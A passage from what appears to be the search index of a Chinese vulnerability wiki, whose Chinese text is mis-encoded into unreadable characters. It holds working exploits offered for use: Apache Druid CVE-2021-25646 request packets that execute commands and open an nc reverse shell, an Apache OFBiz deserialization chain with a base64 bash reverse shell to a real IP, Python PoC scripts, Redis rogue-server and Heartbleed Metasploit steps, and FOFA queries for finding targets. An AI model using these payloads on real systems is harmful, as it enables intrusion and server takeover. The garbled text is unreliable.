ÂÖ∂‰ªñ‰ø°ÊÅØ 1„ÄÅstatÔºöÂàóÂá∫ÂÖ≥‰∫éÊÄßËÉΩÂíåËøûÊé•ÁöÑÂÆ¢Êà∑Á´ØÁöÑÁªüËÆ°‰ø°ÊÅØ„ÄÇ echo stat |ncat 127.0.0.1 2181 2„ÄÅruokÔºöÊµãËØïÊúçÂä°Âô®ÊòØÂê¶ËøêË°åÂú®ÈùûÈîôËØØÁä∂ÊÄÅ„ÄÇ echo ruok |ncat 127.0.0.1 2181 3„ÄÅreqsÔºöÂàóÂá∫Êú™ÂÆåÊàêÁöÑËØ∑Ê±Ç„ÄÇ echo reqs |ncat 127.0.0.1 2181 „ÄÄ„ÄÄ 4„ÄÅenviÔºöÊâìÂç∞ÊúâÂÖ≥ÊúçÂä°ÁéØÂ¢ÉÁöÑËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇ echo envi |ncat 127.0.0.1 2181 „ÄÄ„ÄÄ 5„ÄÅdumpÔºöÂàóÂá∫Êú™ÂÆåÊàêÁöÑ‰ºöËØùÂíå‰∏¥Êó∂ËäÇÁÇπ„ÄÇ echo dump |ncat 127.0.0.1 2181 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Druid/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Druid/","title":"Apache Druid","keywords":"","body":"Apache Druid Apache Druid ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-25646 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Druid/Apache Druid ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-25646.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Druid/Apache Druid ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-25646.html","title":"Apache Druid ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-25646","keywords":"","body":"Apache Druid ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-25646 ÊºèÊ¥ûÊèèËø∞ Apache Druid ÊòØÁî®JavaÁºñÂÜôÁöÑÈù¢ÂêëÂàóÁöÑÂºÄÊ∫êÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ≠òÂÇ®ÔºåÊó®Âú®Âø´ÈÄüËé∑ÂèñÂ§ßÈáè‰∫ã‰ª∂Êï∞ÊçÆÔºåÂπ∂Âú®Êï∞ÊçÆ‰πã‰∏äÊèê‰æõ‰ΩéÂª∂ËøüÊü•ËØ¢„ÄÇ Apache Druid ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÁº∫‰πèÊéàÊùÉËÆ§ËØÅÔºåÊîªÂáªËÄÖÂèØ‰ª•ÂèëÈÄÅÁâπÂà∂ËØ∑Ê±ÇÔºåÂà©Áî®DruidÊúçÂä°Âô®‰∏äËøõÁ®ãÁöÑÁâπÊùÉÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ Apache DruidÂåÖÊã¨ÊâßË°åÁî®Êà∑Êèê‰æõÁöÑJavaScriptÁöÑÂäüËÉΩÂµåÂÖ•Âú®ÂêÑÁßçÁ±ªÂûãËØ∑Ê±Ç‰∏≠ÁöÑ‰ª£Á†Å„ÄÇÊ≠§ÂäüËÉΩÂú®Áî®‰∫éÈ´ò‰ø°‰ªªÂ∫¶ÁéØÂ¢É‰∏≠ÔºåÈªòËÆ§Â∑≤Ë¢´Á¶ÅÁî®„ÄÇ‰ΩÜÊòØÔºåÂú®Druid 0.20.0ÂèäÊõ¥‰ΩéÁâàÊú¨‰∏≠ÔºåÁªèËøáË∫´‰ªΩÈ™åËØÅÁöÑÁî®Êà∑ÂèëÈÄÅÊÅ∂ÊÑèËØ∑Ê±ÇÔºåÂà©Áî®Apache DruidÊºèÊ¥ûÂèØ‰ª•ÊâßË°å‰ªªÊÑè‰ª£Á†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache Druid ÁéØÂ¢ÉÊê≠Âª∫ ËøôÈáå‰ΩøÁî®DockerÊù•Êê≠Âª∫ÁéØÂ¢É Docker‰∏ãËΩΩÈìæÊé•: https://github.com/apache/druid/archive/druid-0.20.0.zip ‰∏ãËΩΩ‰πãÂêéËøõÂÖ•ÁõÆÂΩï distribution\\docker ÊâßË°åÂëΩ‰ª§ÁºñËØë docker-compose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8888 Ê≠£Â∏∏Â∞±Ë°å‰∫Ü ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÂéüÁêÜ: https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw POCËØ∑Ê±ÇÂåÖ POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx‚Äã:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 995 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec('ping xxxxx.dnslog.cn')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} [!NOTE] Ê≥®ÊÑèËØ∑Ê±Ç‰∏≠Ëøô‰∏™‰ΩçÁΩÆÊîπ‰∏∫‰Ω†ÁöÑdnslogÂπ≥Âè∞Âú∞ÂùÄ java.lang.Runtime.getRuntime().exec('ping -c 4 xxxxx.dnslog.cn') ÂèëÈÄÅËØ∑Ê±ÇÂç≥ÂèØÂëΩ‰ª§ÊâßË°å [!NOTE] Áúã‰∫Ü‰∏ãÂèØËÉΩÂ§ßÈÉ®ÂàÜÈÉΩÊòØdockerÊê≠Âª∫ÔºåËÄåÈáåÈù¢Â§ßÈÉ®ÂàÜÂëΩ‰ª§ÊòØ‰∏çÂ≠òÂú®ÁöÑÔºå‰ΩÜÊòØÂèëÁé∞dockerÈáåÈù¢Â±ÖÁÑ∂ÈªòËÆ§ÊòØÊúâ NC ÂëΩ‰ª§ÁöÑÔºåÈÇ£Êàë‰ª¨Â∞±ÂèØ‰ª•Áî®ncÂèçÂºπ‰∏Ä‰∏™shell‰∫Ü ÂèçÂºπshellËØ∑Ê±ÇÂåÖ POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx‚Äã:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 1008 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec(' nc xxx.xxx.xxx.xxx 9999 -e /bin/sh')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} ÂèëÈÄÅËØ∑Ê±ÇÂåÖÂ∞±ÂèØ‰ª•ÂæóÂà∞‰∏Ä‰∏™‰∫§‰∫íÂºèshell‰∫Ü Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache OFBiz/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache OFBiz/","title":"Apache OFBiz","keywords":"","body":"Apache OFBiz Apache OFBiz RMIÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2021-26295 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache OFBiz/Apache OFBiz RMIÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2021-26295.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache OFBiz/Apache OFBiz RMIÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2021-26295.html","title":"Apache OFBiz RMIÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2021-26295","keywords":"","body":"Apache OFBiz rmiÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2021-26295 ÊºèÊ¥ûÊèèËø∞ OFBizÊòØÂü∫‰∫éJavaÁöÑWebÊ°ÜÊû∂ÔºåÂåÖÊã¨ÂÆû‰ΩìÂºïÊìéÔºåÊúçÂä°ÂºïÊìéÂíåÂü∫‰∫éÂ∞èÈÉ®‰ª∂ÁöÑUI„ÄÇ ËøëÊó•ÔºåApache OFBizÂÆòÊñπÂèëÂ∏ÉÂÆâÂÖ®Êõ¥Êñ∞„ÄÇApache OFBiz Â≠òÂú®RMIÂèçÂ∫èÂàóÂåñÂâçÂè∞ÂëΩ‰ª§ÊâßË°åÔºåÊú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑÊîªÂáªËÄÖÂèØ‰ª•‰ΩøÁî®Ê≠§ÊºèÊ¥ûÊù•ÊàêÂäüÊé•ÁÆ°Apache OFBizÔºåÂª∫ËÆÆÁõ∏ÂÖ≥Áî®Êà∑Â∞ΩÂø´ÊµãËØïÊºèÊ¥û‰øÆÂ§çÁöÑÁâàÊú¨Âπ∂ÂèäÊó∂ÂçáÁ∫ß„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache OFBiz FOFA [!NOTE] app=\"Apache_OFBiz\" ÁéØÂ¢ÉÊê≠Âª∫ docker run -d -p 8000:8080 -p 8443:8443 opensourceknight/ofbiz ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®ÊñáÁ´†ÁõÆÂΩï‰∏≠ÁöÑPOCËÑöÊú¨ È™åËØÅ Dnslog ÂèçÂºπshell‰ΩøÁî® ROMEÂèçÂ∫èÂàóÂåñÈìæÂ∞±Ë°å‰∫Ü java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' bash -c 'exec bash -i &>/dev/tcp/81.68.139.186/9999 ÁÑ∂ÂêéÊääÊï∞ÊçÆÂ°´ÂÖ•‰∏ãÈù¢ÁöÑ ÂèçÂºπshellËÑöÊú¨‰∏≠ÁöÑHex_dataÂèÇÊï∞‰∏≠ËøêË°åËÑöÊú¨Âç≥ÂèØÂèçÂºπshell ÊºèÊ¥ûÂà©Áî®POC [!NOTE] ÈúÄË¶ÅÂ∞ÜPOCÊîæÂú®‰∏é ysoserial.jar Âêå‰∏ÄÁõÆÂΩï ‰∏Ä‰∏™‰∏∫ dnslogÊ£ÄÊµãÔºåÂè¶‰∏Ä‰∏™‰∏∫ÂèçÂºπshell import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache OFBiz \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def trans(s): return \"%s\" % ''.join('%.2x' % x for x in s) def POC_1(target_url, Dnslog): popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', \"URLDNS\", Dnslog], stdout=subprocess.PIPE) data = popen.stdout.read() hex_data = trans(data) headers = { 'Content-Type': 'text/xml' } post_data = '''%s''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/webtools/control/SOAPService..... \\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[36m[o] ËØ∑Ê£ÄÊü• Dnslog ÂìçÂ∫î\\n \\033[0m\") else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, Dnslog) [!NOTE] ÂèçÂºπshellËÑöÊú¨ import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache OFBiz \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mHex_data >>> Âú®Êñá‰ª∂‰∏≠‰øÆÊîπ \\033[0m') print('+------------------------------------------') def POC_1(target_url, Dnslog): # java -jar ysoserial.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' hex_data = \"aced0xxxxxxxxxxxxxxxxxxxxxx678\" headers = { 'Content-Type': 'text/xml' } post_data = '''%s''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/webtools/control/SOAPService..... \\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[36m[o] ËØ∑Ê£ÄÊü• ÁõëÂê¨Âú∞ÂùÄ ÂìçÂ∫î\\n \\033[0m\") else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, Dnslog) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Zeppelin/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Zeppelin/","title":"Apache Zeppelin","keywords":"","body":"Apache Zeppelin Apache Zeppelin Êú™ÊéàÊùÉ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Zeppelin/Apache Zeppelin Êú™ÊéàÊùÉ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Zeppelin/Apache Zeppelin Êú™ÊéàÊùÉ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Apache Zeppelin Êú™ÊéàÊùÉ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Apache Zeppelin Êú™ÊéàÊùÉ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Apache Zeppelin Â≠òÂú®Êú™ÊéàÊùÉÁöÑÁî®Êà∑ËÆøÈóÆÂëΩ‰ª§ÊâßË°åÊé•Âè£ÔºåÂØºËá¥‰∫Ü‰ªªÊÑèÁî®Êà∑ÈÉΩÂèØ‰ª•ÊâßË°åÊÅ∂ÊÑèÂëΩ‰ª§Ëé∑ÂèñÊúçÂä°Âô®ÊùÉÈôê ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache Zeppelin FOFA [!NOTE] icon_hash=\"960250052\" ÊºèÊ¥ûÂ§çÁé∞ Âê´ÊúâÊºèÊ¥ûÁöÑÈ°µÈù¢Â¶Ç‰∏ã ÁÇπÂáª ÂàõÂª∫‰∏Ä‰∏™ÂåøÂêçÁî®Êà∑Âú®Áî®Êà∑È°µÈù¢ÊâßË°åÂëΩ‰ª§Âç≥ÂèØ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/","title":"ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û","keywords":"","body":"ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥ûü¶î Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Redis/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Redis/","title":"Redis","keywords":"","body":"Redis Redis Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Redis/Redis Â∞è‰∫é5.0.5 ‰∏ª‰ªéÂ§çÂà∂ RCE .html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Redis/Redis Â∞è‰∫é5.0.5 ‰∏ª‰ªéÂ§çÂà∂ RCE .html","title":"Redis <= 5.0.5 ‰∏ª‰ªéÂ§çÂà∂ RCE ","keywords":"","body":"Redis ÊºèÊ¥ûÊèèËø∞ Âú®2019Âπ¥7Êúà7Êó•ÁªìÊùüÁöÑWCTF2019 Final‰∏äÔºåLC/BCÁöÑÊàêÂëòPavel ToporkovÂú®ÂàÜ‰∫´‰ºö‰∏ä‰ªãÁªç‰∫Ü‰∏ÄÁßçÂÖ≥‰∫éredisÊñ∞ÁâàÊú¨ÁöÑRCEÂà©Áî®ÊñπÂºèÔºåÊØîËµ∑‰ª•ÂâçÁöÑÂà©Áî®ÊñπÂºèÊù•ËØ¥ÔºåËøôÁßçÂà©Áî®ÊñπÂºèÊõ¥‰∏∫ÈÄöÁî®ÔºåÂç±ÂÆ≥‰πüÊõ¥Â§ß Pavel ToporkovÁöÑÂàÜ‰∫´ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Redis ÁéØÂ¢ÉÊê≠Âª∫ docker pull damonevking/redis5.0 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server nmapÊâ´Êèè‰∏Ä‰∏ã6379Á´ØÂè£ÂºÄÊîæÂç≥‰∏∫Êê≠Âª∫ÊàêÂäü root@kali:~/Ê°åÈù¢# docker pull damonevking/redis5.0 Using default tag: latest latest: Pulling from damonevking/redis5.0 fc7181108d40: Pull complete 3e0ac67cad82: Pull complete 6ee495cb7235: Pull complete 9f7206d08b9d: Pull complete a8354ef8cccb: Pull complete 53afb10d81c2: Pull complete Digest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f Status: Downloaded newer image for damonevking/redis5.0:latest docker.io/damonevking/redis5.0:latest root@kali:~/Ê°åÈù¢# docker run -p 6379:6379 -d damonevking/redis5.0 redis-server 1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12 root@kali:~/Ê°åÈù¢# nmap 127.0.0.1 -p 6379 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:47 CST Nmap scan report for localhost (127.0.0.1) Host is up (0.000099s latency). PORT STATE SERVICE 6379/tcp open redis Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds ÊºèÊ¥ûÂ§çÁé∞ ÂÖ≥‰∫éÊºèÊ¥ûÂéüÁêÜËØ∑Êü•ÁúãPavel ToporkovÁöÑÂàÜ‰∫´ ÊºèÊ¥ûÂà©Áî®ËÑöÊú¨: n0b0dyCN/redis-rogue-server ‚ûú ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [options] Options: -h, --help show this help message and exit --rhost=REMOTE_HOST target host --rport=REMOTE_PORT target redis port, default 6379 --lhost=LOCAL_HOST rogue server ip --lport=LOCAL_PORT rogue server listen port, default 21000 --exp=EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream Example python3 redis-rogue-server.py --rhost 192.168.51.146 --lhost 192.168.51.146 --exp=exp.so Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/OpenSSL/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/OpenSSL/","title":"OpenSSL","keywords":"","body":"OpenSSL OpenSSL ÂøÉËÑèÊª¥Ë°ÄÊºèÊ¥û CVE-2014-0160 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/OpenSSL/OpenSSL ÂøÉËÑèÊª¥Ë°ÄÊºèÊ¥û CVE-2014-0160.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/OpenSSL/OpenSSL ÂøÉËÑèÊª¥Ë°ÄÊºèÊ¥û CVE-2014-0160.html","title":"OpenSSL ÂøÉËÑèÊª¥Ë°ÄÊºèÊ¥û CVE-2014-0160","keywords":"","body":"OpenSSL ÂøÉËÑèÊª¥Ë°ÄÊºèÊ¥û CVE-2014-0160 ÊºèÊ¥ûÊèèËø∞ 2014Âπ¥4Êúà7Êó•ÔºåOpenSSLÂèëÂ∏ÉÂÆâÂÖ®ÂÖ¨ÂëäÔºåÂú®OpenSSL1.0.1ÁâàÊú¨Ëá≥OpenSSL1.0.1f Beta1ÁâàÊú¨‰∏≠Â≠òÂú®ÊºèÊ¥ûÔºåËØ•ÊºèÊ¥û‰∏≠ÊñáÂêçÁß∞‰∏∫ÂøÉËÑèÊª¥Ë°ÄÔºåËã±ÊñáÂêçÁß∞‰∏∫HeartBleed„ÄÇÂÖ∂‰∏≠HeartÊòØÊåáËØ•ÊºèÊ¥û‰Ωç‰∫éÂøÉË∑≥ÂçèËÆÆ‰∏äÔºåBleedÊòØÂõ†‰∏∫ËØ•ÊºèÊ¥û‰ºöÈÄ†ÊàêÊï∞ÊçÆÊ≥ÑÈú≤„ÄÇÂç≥HeartBleedÊòØÂú®ÂøÉË∑≥ÂçèËÆÆ‰∏äÁöÑ‰∏Ä‰∏™Êï∞ÊçÆÊ≥ÑÈú≤ÊºèÊ¥ûÔºåOpenSSLÂ∫ì‰∏≠Áî®Âà∞‰∫ÜËØ•ÂøÉË∑≥ÂçèËÆÆ„ÄÇHeartBleed‰∏ªË¶ÅÂ≠òÂú®‰∏éOpenSSLÁöÑ1.0.1ÁâàÊú¨Âà∞1.0.1fÁâàÊú¨„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] OpenSSL1.0.1„ÄÅ1.0.1a„ÄÅ1.0.1b„ÄÅ1.0.1c„ÄÅ1.0.1d„ÄÅ1.0.1e„ÄÅ1.0.1f„ÄÅBeta 1 of OpenSSL 1.0.2Á≠âÁâàÊú¨ ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®NmapÊ£ÄÊµãËÑöÊú¨ÂØπÁõÆÊ†áËøõË°åÊ£ÄÊµã Ê£ÄÊµãÂà∞ÂøÉËÑèÊª¥Ë°ÄÊºèÊ¥ûÔºå‰ΩøÁî®MSFÂØπÁõÆÊ†áËøõË°åÊîªÂáª msf5 > use auxiliary/scanner/ssl/openssl_heartbleed msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options Module options (auxiliary/scanner/ssl/openssl_heartbleed): Name Current Setting Required Description ---- --------------- -------- ----------- DUMPFILTER no Pattern to filter leaked memory before storing LEAK_COUNT 1 yes Number of times to leak memory per SCAN or DUMP invocation MAX_KEYTRIES 50 yes Max 